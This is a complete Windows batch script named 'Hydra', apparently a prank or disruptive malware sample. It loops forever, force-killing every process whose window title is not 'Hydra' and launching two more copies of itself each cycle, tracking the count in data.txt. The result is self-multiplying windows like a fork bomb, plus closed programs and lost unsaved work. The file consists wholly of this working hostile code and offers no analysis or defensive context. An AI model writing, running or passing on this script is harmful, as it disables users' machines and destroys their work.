@ECHO OFF
SETLOCAL EnableDelayedExpansion
TITLE Hydra 
SET n=0
IF NOT EXIST data.txt TYPE nul > data.txt
:begin
SET /A n+=1
FINDSTR /M "%n%" data.txt
IF %errorlevel%==0 (
GOTO :begin
)
:loop 
FOR /F "tokens=* USEBACKQ" %%F IN (`TASKLIST /FI "WINDOWTITLE eq Hydra" ^| FIND/C "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
SET /A n+=1
ECHO !n! > data.txt
)
GOTO :loop
